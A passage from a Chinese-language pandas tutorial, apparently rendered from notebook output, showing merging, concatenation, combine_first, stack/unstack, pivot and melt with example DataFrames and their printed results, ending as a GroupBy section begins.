group_val 0 a 0 3.5 2 a 2 3.5 3 a 3 3.5 1 b 1 7.0 4 b 4 7.0 对于层次化索引的数据，事情就有点复杂了，因为索引的合并默认是多键合并： 1234lefth = pd.DataFrame(&#123;'key1': ['Ohio', 'Ohio', 'Ohio', 'Nevada', 'Nevada'], 'key2': [2000, 2001, 2002, 2001, 2002], 'data': np.arange(5.)&#125;)lefth .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 data 0 Ohio 2000 0.0 1 Ohio 2001 1.0 2 Ohio 2002 2.0 3 Nevada 2001 3.0 4 Nevada 2002 4.0 12345righth = pd.DataFrame(np.arange(12).reshape((6, 2)), index=[['Nevada', 'Nevada', 'Ohio', 'Ohio', 'Ohio', 'Ohio'], [2001, 2000, 2000, 2000, 2001, 2002]], columns=['event1', 'event2'])righth .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } event1 event2 Nevada 2001 0 1 2000 2 3 Ohio 2000 4 5 2000 6 7 2001 8 9 2002 10 11 这种情况下，你必须以列表的形式指明用作合并键的多个列 1pd.merge(lefth, righth, left_on=['key1', 'key2'], right_index=True) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 data event1 event2 0 Ohio 2000 0.0 4 5 0 Ohio 2000 0.0 6 7 1 Ohio 2001 1.0 8 9 2 Ohio 2002 2.0 10 11 3 Nevada 2001 3.0 0 1 同时使用合并双方的索引也没问题： 1234left2 = pd.DataFrame([[1., 2.], [3., 4.], [5., 6.]], index=['a', 'c', 'e'], columns=['Ohio', 'Nevada'])left2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ohio Nevada a 1.0 2.0 c 3.0 4.0 e 5.0 6.0 1234right2 = pd.DataFrame([[7., 8.], [9., 10.], [11., 12.], [13, 14]], index=['b', 'c', 'd', 'e'], columns=['Missouri', 'Alabama'])right2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Missouri Alabama b 7.0 8.0 c 9.0 10.0 d 11.0 12.0 e 13.0 14.0 1pd.merge(left2, right2, how='outer', left_index=True, right_index=True) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ohio Nevada Missouri Alabama a 1.0 2.0 NaN NaN b NaN NaN 7.0 8.0 c 3.0 4.0 9.0 10.0 d NaN NaN 11.0 12.0 e 5.0 6.0 13.0 14.0 DataFrame还有一个便捷的join实例方法，它能更为方便地实现按索引合并。它还可用于合并多个带有相同或相似索引的DataFrame对象，但要求没有重叠的列。 1left2.join(right2, how='outer') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ohio Nevada Missouri Alabama a 1.0 2.0 NaN NaN b NaN NaN 7.0 8.0 c 3.0 4.0 9.0 10.0 d NaN NaN 11.0 12.0 e 5.0 6.0 13.0 14.0 DataFrame的join方法默认使用的是左连接，保留左边表的行索引。它还支持在调用的DataFrame的列上，连接传递的DataFrame索引： 1left1.join(right1, on='key') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key value group_val 0 a 0 3.5 1 b 1 7.0 2 a 2 3.5 3 a 3 3.5 4 b 4 7.0 5 c 5 NaN 对于简单的索引合并，你还可以向join传入一组DataFrame 1234another = pd.DataFrame([[7., 8.], [9., 10.], [11., 12.], [16., 17.]], index=['a', 'c', 'e', 'f'], columns=['New York', 'Oregon'])another .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } New York Oregon a 7.0 8.0 c 9.0 10.0 e 11.0 12.0 f 16.0 17.0 1left2.join([right2, another]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ohio Nevada Missouri Alabama New York Oregon a 1.0 2.0 NaN NaN 7.0 8.0 c 3.0 4.0 9.0 10.0 9.0 10.0 e 5.0 6.0 13.0 14.0 11.0 12.0 轴向连接另一种数据合并运算也被称作连接（concatenation）、绑定（binding）或堆叠（stacking）。NumPy的concatenate函数可以用NumPy数组来做： 12arr = np.arange(12).reshape((3, 4))arr array([[ 0, 1, 2, 3], [ 4, 5, 6, 7], [ 8, 9, 10, 11]]) 1np.concatenate([arr, arr], axis=1) array([[ 0, 1, 2, 3, 0, 1, 2, 3], [ 4, 5, 6, 7, 4, 5, 6, 7], [ 8, 9, 10, 11, 8, 9, 10, 11]]) 对于pandas对象（如Series和DataFrame），带有标签的轴使你能够进一步推广数组的连接运算。pandas的concat函数提供了一种能够解决这些问题的可靠方式。 12345678s1 = pd.Series([0, 1], index=['a', 'b'])s2 = pd.Series([2, 3, 4], index=['c', 'd', 'e'])s3 = pd.Series([5, 6], index=['f', 'g'])# 把三个 series 连接在一起pd.concat([s1, s2, s3]) a 0 b 1 c 2 d 3 e 4 f 5 g 6 dtype: int64 默认情况下，concat是在axis=0上工作的，最终产生一个新的Series。如果传入axis=1，则结果就会变成一个DataFrame（axis=1是列）： 1pd.concat([s1, s2, s3], axis=1) /usr/local/lib/python3.6/site-packages/ipykernel_launcher.py:1: FutureWarning: Sorting because non-concatenation axis is not aligned. A future version of pandas will change to not sort by default. To accept the future behavior, pass &apos;sort=False&apos;. To retain the current behavior and silence the warning, pass &apos;sort=True&apos;. &quot;&quot;&quot;Entry point for launching an IPython kernel. .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 a 0.0 NaN NaN b 1.0 NaN NaN c NaN 2.0 NaN d NaN 3.0 NaN e NaN 4.0 NaN f NaN NaN 5.0 g NaN NaN 6.0 这种情况下，另外的轴上没有重叠，从索引的有序并集（外连接）上就可以看出来。传入join=’inner’即可得到它们的交集： 12s4 = pd.concat([s1, s3])s4 a 0 b 1 f 5 g 6 dtype: int64 1pd.concat([s1, s4], axis=1) /usr/local/lib/python3.6/site-packages/ipykernel_launcher.py:1: FutureWarning: Sorting because non-concatenation axis is not aligned. A future version of pandas will change to not sort by default. To accept the future behavior, pass &apos;sort=False&apos;. To retain the current behavior and silence the warning, pass &apos;sort=True&apos;. &quot;&quot;&quot;Entry point for launching an IPython kernel. .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 a 0.0 0 b 1.0 1 f NaN 5 g NaN 6 1pd.concat([s1, s4], axis=1, join='inner') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 a 0 0 b 1 1 通过 join_axes 指定要在其它轴上使用的索引： 1pd.concat([s1, s4], axis=1, join_axes=[['a', 'c', 'b', 'e']]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 a 0.0 0.0 c NaN NaN b 1.0 1.0 e NaN NaN 不过有个问题，参与连接的片段在结果中区分不开。假设你想要在连接轴上创建一个层次化索引。使用keys参数即可达到这个目的： 12result = pd.concat([s1, s1, s3], keys=['one','two', 'three'])result one a 0 b 1 two a 0 b 1 three f 5 g 6 dtype: int64 1result.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b f g one 0.0 1.0 NaN NaN two 0.0 1.0 NaN NaN three NaN NaN 5.0 6.0 如果沿着 axis=1 对Series进行合并，则keys就会成为DataFrame的列头： 1pd.concat([s1, s2, s3], axis=1, keys=['one','two', 'three'], sort=True) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three a 0.0 NaN NaN b 1.0 NaN NaN c NaN 2.0 NaN d NaN 3.0 NaN e NaN 4.0 NaN f NaN NaN 5.0 g NaN NaN 6.0 同样的逻辑也适用于DataFrame对象： 12df1 = pd.DataFrame(np.arange(6).reshape(3, 2), index=['a', 'b', 'c'], columns=['one', 'two'])df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two a 0 1 b 2 3 c 4 5 12df2 = pd.DataFrame(5 + np.arange(4).reshape(2, 2), index=['a', 'c'], columns=['three', 'four'])df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } three four a 5 6 c 7 8 1pd.concat([df1, df2], axis=1, keys=['level1', 'level2'], sort = False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } level1 level2 one two three four a 0 1 5.0 6.0 b 2 3 NaN NaN c 4 5 7.0 8.0 如果传入的不是列表而是一个字典，则字典的键就会被当做keys选项的值： 1pd.concat(&#123;'level1': df1, 'level2': df2&#125;, axis=1, sort = False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } level1 level2 one two three four a 0 1 5.0 6.0 b 2 3 NaN NaN c 4 5 7.0 8.0 我们可以用names参数命名创建的轴级别： 1pd.concat([df1, df2], axis=1, keys=['level1', 'level2'], names=['upper', 'lower'], sort = False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } upper level1 level2 lower one two three four a 0 1 5.0 6.0 b 2 3 NaN NaN c 4 5 7.0 8.0 DataFrame 在连接的时候会使用原来的索引，可以通过 ignore_index=True 来放弃使用 12df1 = pd.DataFrame(np.random.randn(3, 4), columns=['a', 'b', 'c', 'd'])df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 -1.044321 -0.049004 0.026555 -0.315565 1 -0.085761 0.873464 -1.368797 0.302554 2 0.277496 -0.570469 -0.606294 1.253497 12df2 = pd.DataFrame(np.random.randn(2, 3), columns=['b', 'd', 'a'])df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b d a 0 0.343570 -0.310123 -0.379563 1 -1.083807 -1.480836 -1.255112 1pd.concat([df1, df2], sort = False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 -1.044321 -0.049004 0.026555 -0.315565 1 -0.085761 0.873464 -1.368797 0.302554 2 0.277496 -0.570469 -0.606294 1.253497 0 -0.379563 0.343570 NaN -0.310123 1 -1.255112 -1.083807 NaN -1.480836 1pd.concat([df1, df2], ignore_index=True, sort = False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 -1.044321 -0.049004 0.026555 -0.315565 1 -0.085761 0.873464 -1.368797 0.302554 2 0.277496 -0.570469 -0.606294 1.253497 3 -0.379563 0.343570 NaN -0.310123 4 -1.255112 -1.083807 NaN -1.480836 concat函数的参数 合并重叠数据还有一种数据组合问题不能用简单的合并（merge）或连接（concatenation）运算来处理。比如说，你可能有索引全部或部分重叠的两个数据集。举个有启发性的例子，我们使用NumPy的where函数，它表示一种等价于面向数组的if-else： 就是用一个数据组合来填充另一个数据组合的空值 123456a = pd.Series([np.nan, 2.5, np.nan, 3.5, 4.5, np.nan], index=['f', 'e', 'd', 'c', 'b', 'a'])b = pd.Series(np.arange(len(a), dtype=np.float64), index=['f', 'e', 'd', 'c', 'b', 'a'])b[-1] = np.nana f NaN e 2.5 d NaN c 3.5 b 4.5 a NaN dtype: float64 1b f 0.0 e 1.0 d 2.0 c 3.0 b 4.0 a NaN dtype: float64 1np.where(pd.isnull(a), b, a) array([0. , 2.5, 2. , 3.5, 4.5, nan]) Series 和 DataFrame 有一个 combine_first 方法，实现的也是一样的功能，还带有pandas的数据对齐： 1b[:-2].combine_first(a[2:]) a NaN b 4.5 c 3.0 d 2.0 e 1.0 f 0.0 dtype: float64 1234df1 = pd.DataFrame(&#123;'a': [1., np.nan, 5., np.nan], 'b': [np.nan, 2., np.nan, 6.], 'c': range(2, 18, 4)&#125;)df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c 0 1.0 NaN 2 1 NaN 2.0 6 2 5.0 NaN 10 3 NaN 6.0 14 123df2 = pd.DataFrame(&#123;'a': [5., 4., np.nan, 3., 7.], 'b': [np.nan, 3., 4., 6., 8.]&#125;)df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b 0 5.0 NaN 1 4.0 3.0 2 NaN 4.0 3 3.0 6.0 4 7.0 8.0 1df1.combine_first(df2) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c 0 1.0 NaN 2.0 1 4.0 2.0 6.0 2 5.0 4.0 10.0 3 3.0 6.0 14.0 4 7.0 8.0 NaN 重塑和轴向旋转有许多用于重新排列表格型数据的基础运算。这些函数也称作重塑（reshape）或轴向旋转（pivot）运算。 重塑层次化索引层次化索引为DataFrame数据的重排任务提供了一种具有良好一致性的方式。主要功能有二： stack：将数据的列“旋转”为行。 unstack：将数据的行“旋转”为列。 1234data = pd.DataFrame(np.arange(6).reshape((2, 3)), index=pd.Index(['Ohio','Colorado'], name='state'), columns=pd.Index(['one', 'two', 'three'], name='number'))data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } number one two three state Ohio 0 1 2 Colorado 3 4 5 对该数据使用stack方法即可将列转换为行，得到一个Series： 12result = data.stack()result state number Ohio one 0 two 1 three 2 Colorado one 3 two 4 three 5 dtype: int64 对于一个层次化索引的Series，你可以用unstack将其重排为一个DataFrame： 1result.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } number one two three state Ohio 0 1 2 Colorado 3 4 5 默认情况下，unstack操作的是最内层（stack也是如此）。传入分层级别的编号或名称即可对其它级别进行unstack操作： 1result.unstack(0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state Ohio Colorado number one 0 3 two 1 4 three 2 5 1result.unstack('state') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state Ohio Colorado number one 0 3 two 1 4 three 2 5 如果不是所有的级别值都能在各分组中找到的话，则unstack操作可能会引入缺失数据： 123456s1 = pd.Series([0, 1, 2, 3], index=['a', 'b', 'c', 'd'])s2 = pd.Series([4, 5, 6], index=['c', 'd', 'e'])data2 = pd.concat([s1, s2], keys=['one', 'two'])data2 one a 0 b 1 c 2 d 3 two c 4 d 5 e 6 dtype: int64 1data2.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d e one 0.0 1.0 2.0 3.0 NaN two NaN NaN 4.0 5.0 6.0 1data2.unstack().stack() one a 0.0 b 1.0 c 2.0 d 3.0 two c 4.0 d 5.0 e 6.0 dtype: float64 12# 保留 nan 数据data2.unstack().stack(dropna=False) one a 0.0 b 1.0 c 2.0 d 3.0 e NaN two a NaN b NaN c 4.0 d 5.0 e 6.0 dtype: float64 在对DataFrame进行unstack操作时，作为旋转轴的级别将会成为结果中的最低级别： 123df = pd.DataFrame(&#123;'left': result, 'right': result + 5&#125;, columns=pd.Index(['left', 'right'], name='side'))df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } side left right state number Ohio one 0 5 two 1 6 three 2 7 Colorado one 3 8 two 4 9 three 5 10 12# state 列转换成行的时候，行的级别是最低的(在 side 下面)df.unstack('state') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } side left right state Ohio Colorado Ohio Colorado number one 0 3 5 8 two 1 4 6 9 three 2 5 7 10 当调用stack，我们可以指明轴的名字： 1df.unstack('state').stack('side') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } state Colorado Ohio number side one left 3 0 right 8 5 two left 4 1 right 9 6 three left 5 2 right 10 7 将“长格式”旋转为“宽格式”多个时间序列数据通常是以所谓的“长格式”（long）或“堆叠格式”（stacked）存储在数据库和CSV中的。 12data = pd.read_csv('data/examples/macrodata.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year quarter realgdp realcons realinv realgovt realdpi cpi m1 tbilrate unemp pop infl realint 0 1959.0 1.0 2710.349 1707.4 286.898 470.045 1886.9 28.98 139.7 2.82 5.8 177.146 0.00 0.00 1 1959.0 2.0 2778.801 1733.7 310.859 481.301 1919.7 29.15 141.7 3.08 5.1 177.830 2.34 0.74 2 1959.0 3.0 2775.488 1751.8 289.226 491.260 1916.4 29.35 140.5 3.82 5.3 178.657 2.74 1.09 3 1959.0 4.0 2785.204 1753.7 299.356 484.052 1931.3 29.37 140.0 4.33 5.6 179.386 0.27 4.06 4 1960.0 1.0 2847.699 1770.5 331.722 462.199 1955.5 29.54 139.6 3.50 5.2 180.007 2.31 1.19 123# 使用几个时间列拼接成一个时间索引periods = pd.PeriodIndex(year=data.year, quarter=data.quarter, name='date')periods PeriodIndex([&apos;1959Q1&apos;, &apos;1959Q2&apos;, &apos;1959Q3&apos;, &apos;1959Q4&apos;, &apos;1960Q1&apos;, &apos;1960Q2&apos;, &apos;1960Q3&apos;, &apos;1960Q4&apos;, &apos;1961Q1&apos;, &apos;1961Q2&apos;, ... &apos;2007Q2&apos;, &apos;2007Q3&apos;, &apos;2007Q4&apos;, &apos;2008Q1&apos;, &apos;2008Q2&apos;, &apos;2008Q3&apos;, &apos;2008Q4&apos;, &apos;2009Q1&apos;, &apos;2009Q2&apos;, &apos;2009Q3&apos;], dtype=&apos;period[Q-DEC]&apos;, name=&apos;date&apos;, length=203, freq=&apos;Q-DEC&apos;) 123# 创建索引columns = pd.Index(['realgdp', 'infl', 'unemp'], name='item')columns Index([&apos;realgdp&apos;, &apos;infl&apos;, &apos;unemp&apos;], dtype=&apos;object&apos;, name=&apos;item&apos;) 123# 选取索引中的那几列data = data.reindex(columns=columns)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } item realgdp infl unemp 0 2710.349 0.00 5.8 1 2778.801 2.34 5.1 2 2775.488 2.74 5.3 3 2785.204 0.27 5.6 4 2847.699 2.31 5.2 123# 把索引赋值成时间索引data.index = periods.to_timestamp('D', 'end')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } item realgdp infl unemp date 1959-03-31 23:59:59.999999999 2710.349 0.00 5.8 1959-06-30 23:59:59.999999999 2778.801 2.34 5.1 1959-09-30 23:59:59.999999999 2775.488 2.74 5.3 1959-12-31 23:59:59.999999999 2785.204 0.27 5.6 1960-03-31 23:59:59.999999999 2847.699 2.31 5.2 这就是多个时间序列（或者其它带有两个或多个键的可观察数据，这里，我们的键是date和item）的长格式。表中的每行代表一次观察。 12ldata = data.stack().reset_index().rename(columns=&#123;0: 'value'&#125;)ldata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } date item value 0 1959-03-31 23:59:59.999999999 realgdp 2710.349 1 1959-03-31 23:59:59.999999999 infl 0.000 2 1959-03-31 23:59:59.999999999 unemp 5.800 3 1959-06-30 23:59:59.999999999 realgdp 2778.801 4 1959-06-30 23:59:59.999999999 infl 2.340 1data.stack().head() date item 1959-03-31 23:59:59.999999999 realgdp 2710.349 infl 0.000 unemp 5.800 1959-06-30 23:59:59.999999999 realgdp 2778.801 infl 2.340 dtype: float64 1data.stack().reset_index().head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } date item 0 0 1959-03-31 23:59:59.999999999 realgdp 2710.349 1 1959-03-31 23:59:59.999999999 infl 0.000 2 1959-03-31 23:59:59.999999999 unemp 5.800 3 1959-06-30 23:59:59.999999999 realgdp 2778.801 4 1959-06-30 23:59:59.999999999 infl 2.340 关系型数据库（如MySQL）中的数据经常都是这样存储的，因为固定架构（即列名和数据类型）有一个好处：随着表中数据的添加，item列中的值的种类能够增加。在前面的例子中，date和item通常就是主键（用关系型数据库的说法），不仅提供了关系完整性，而且提供了更为简单的查询支持。有的情况下，使用这样的数据会很麻烦，你可能会更喜欢DataFrame，不同的item值分别形成一列，date列中的时间戳则用作索引。DataFrame的pivot方法完全可以实现这个转换： 12pivoted = ldata.pivot('date', 'item', 'value')pivoted.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } item infl realgdp unemp date 1959-03-31 23:59:59.999999999 0.00 2710.349 5.8 1959-06-30 23:59:59.999999999 2.34 2778.801 5.1 1959-09-30 23:59:59.999999999 2.74 2775.488 5.3 1959-12-31 23:59:59.999999999 0.27 2785.204 5.6 1960-03-31 23:59:59.999999999 2.31 2847.699 5.2 前两个传递的值分别用作行和列索引，最后一个可选值则是用于填充DataFrame的数据列。假设有两个需要同时重塑的数据列： 如果忽略最后一个参数，得到的DataFrame就会带有层次化的列： 1ldata.pivot('date', 'item').head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } value item infl realgdp unemp date 1959-03-31 23:59:59.999999999 0.00 2710.349 5.8 1959-06-30 23:59:59.999999999 2.34 2778.801 5.1 1959-09-30 23:59:59.999999999 2.74 2775.488 5.3 1959-12-31 23:59:59.999999999 0.27 2785.204 5.6 1960-03-31 23:59:59.999999999 2.31 2847.699 5.2 12ldata['value2'] = np.random.randn(len(ldata))ldata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } date item value value2 0 1959-03-31 23:59:59.999999999 realgdp 2710.349 0.363946 1 1959-03-31 23:59:59.999999999 infl 0.000 -0.287075 2 1959-03-31 23:59:59.999999999 unemp 5.800 0.144127 3 1959-06-30 23:59:59.999999999 realgdp 2778.801 -0.491877 4 1959-06-30 23:59:59.999999999 infl 2.340 0.725936 1ldata.pivot('date', 'item').head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } value value2 item infl realgdp unemp infl realgdp unemp date 1959-03-31 23:59:59.999999999 0.00 2710.349 5.8 -0.287075 0.363946 0.144127 1959-06-30 23:59:59.999999999 2.34 2778.801 5.1 0.725936 -0.491877 0.026073 1959-09-30 23:59:59.999999999 2.74 2775.488 5.3 1.025040 0.144513 -1.524801 1959-12-31 23:59:59.999999999 0.27 2785.204 5.6 0.530287 -1.027258 -0.158004 1960-03-31 23:59:59.999999999 2.31 2847.699 5.2 -0.476289 0.037717 1.186384 1ldata.pivot('date', 'item', ['value', 'value2']).head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } value value2 item infl realgdp unemp infl realgdp unemp date 1959-03-31 23:59:59.999999999 0.00 2710.349 5.8 -0.287075 0.363946 0.144127 1959-06-30 23:59:59.999999999 2.34 2778.801 5.1 0.725936 -0.491877 0.026073 1959-09-30 23:59:59.999999999 2.74 2775.488 5.3 1.025040 0.144513 -1.524801 1959-12-31 23:59:59.999999999 0.27 2785.204 5.6 0.530287 -1.027258 -0.158004 1960-03-31 23:59:59.999999999 2.31 2847.699 5.2 -0.476289 0.037717 1.186384 pivot其实就是用set_index创建层次化索引，再用unstack重塑： 12unstacked = ldata.set_index(['date', 'item']).unstack('item')unstacked.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } value value2 item infl realgdp unemp infl realgdp unemp date 1959-03-31 23:59:59.999999999 0.00 2710.349 5.8 -0.287075 0.363946 0.144127 1959-06-30 23:59:59.999999999 2.34 2778.801 5.1 0.725936 -0.491877 0.026073 1959-09-30 23:59:59.999999999 2.74 2775.488 5.3 1.025040 0.144513 -1.524801 1959-12-31 23:59:59.999999999 0.27 2785.204 5.6 0.530287 -1.027258 -0.158004 1960-03-31 23:59:59.999999999 2.31 2847.699 5.2 -0.476289 0.037717 1.186384 将“宽格式”旋转为“长格式”旋转DataFrame的逆运算是pandas.melt。它不是将一列转换到多个新的DataFrame，而是合并多个列成为一个，产生一个比输入长的DataFrame。 12345df = pd.DataFrame(&#123;'key': ['foo', 'bar', 'baz'], 'A': [1, 2, 3], 'B': [4, 5, 6], 'C': [7, 8, 9]&#125;)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key A B C 0 foo 1 4 7 1 bar 2 5 8 2 baz 3 6 9 key列可能是分组指标，其它的列是数据值。当使用pandas.melt，我们必须指明哪些列是分组指标。下面使用key作为唯一的分组指标： 12melted = pd.melt(df, ['key'])melted .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key variable value 0 foo A 1 1 bar A 2 2 baz A 3 3 foo B 4 4 bar B 5 5 baz B 6 6 foo C 7 7 bar C 8 8 baz C 9 使用pivot，可以重塑回原来的样子： 12reshaped = melted.pivot('key', 'variable', 'value')reshaped .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } variable A B C key bar 2 5 8 baz 3 6 9 foo 1 4 7 因为pivot的结果从列创建了一个索引，用作行标签，我们可以使用reset_index将数据移回列： 1reshaped.reset_index() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } variable key A B C 0 bar 2 5 8 1 baz 3 6 9 2 foo 1 4 7 还可以指定列的子集，作为值的列： 1pd.melt(df, id_vars=['key'], value_vars=['A', 'B']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key variable value 0 foo A 1 1 bar A 2 2 baz A 3 3 foo B 4 4 bar B 5 5 baz B 6 pandas.melt也可以不用分组指标： 1pd.melt(df, value_vars=['A', 'B', 'C']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } variable value 0 A 1 1 A 2 2 A 3 3 B 4 4 B 5 5 B 6 6 C 7 7 C 8 8 C 9 1pd.melt(df, value_vars=['key', 'A', 'B']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } variable value 0 key foo 1 key bar 2 key baz 3 A 1 4 A 2 5 A 3 6 B 4 7 B 5 8 B 6 数据聚合与分组运算关系型数据库和SQL（Structured Query Language，结构化查询语言）能够如此流行的原因之一就是其能够方便地对数据进行连接、过滤、转换和聚合。但是，像SQL这样的查询语言所能执行的分组运算的种类很有限。在本章中你将会看到，由于Python和pandas强大的表达能力，我们可以执行复杂得多的分组运算（利用任何可以接受pandas对象或NumPy数组的函数）。 GroupBy机制Hadley Wickham（许多热门R语言包的作者）创造了一个用于表示分组运算的术语”split-apply-combine”（拆分－应用－合并）。第一个阶段，pandas对象（无论是Series、DataFrame还是其他的）中的数据会根据你所提供的一个或多个键被拆分（split）为多组。拆分操作是在对象的特定轴上执行的。例如，DataFrame可以在其行（axis=0）或列（axis=1）上进行分组。然后，将一个函数应用（apply）到各个分组并产生一个新值。最后，所有这些函数的执行结果会被合并（combine）到最终的结果对象中。结果对象的形式一般取决于数据上所执行的操作。图10-1大致说明了一个简单的分组聚合过程。 12345df = pd.DataFrame(&#123;'key1' : ['a', 'a', 'b', 'b', 'a'], 'key2' : ['one', 'two', 'one', 'two', 'one'], 'data1' : np.random.randn(5), 'data2' : np.random.randn(5)&#125;)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 data1 data2 0 a one 1.192962 -1.675544 1 a two 1.295617 -0.621154 2 b one 2.506938 -0.954289 3 b two -0.503276 -0.698834 4 a one -0.204452 0.767441 